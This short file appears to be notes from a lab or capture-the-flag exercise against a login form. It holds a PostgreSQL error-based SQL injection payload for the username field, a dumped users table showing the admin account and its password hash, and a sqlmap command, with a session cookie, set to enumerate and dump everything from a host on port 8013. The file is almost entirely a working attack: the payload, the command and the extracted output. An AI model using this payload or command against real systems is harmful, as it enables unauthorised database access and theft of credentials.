# payload=" AND 7446=CAST((CHR(113)||CHR(122)||CHR(112)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (7446=7446) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113)) AS NUMERIC) AND 'lAeQ'='lAeQ&password="

# +----+----------+------------------------------------------------------------------+
# | id | username | password                                                         |
# +----+----------+------------------------------------------------------------------+
# | 1  | admin    | 6d77eed869f7503fdc1a0c7feb648fffe2398a7b7952b91f0a7acc7fb7e26d2d |
# +----+----------+------------------------------------------------------------------+

cd sqlmap-dev
python sqlmap.py -u plsdonthaq.me:8013 --cookie=session=ea6b2590-2416-456f-af53-7033df3de851 --data=username=&password= -a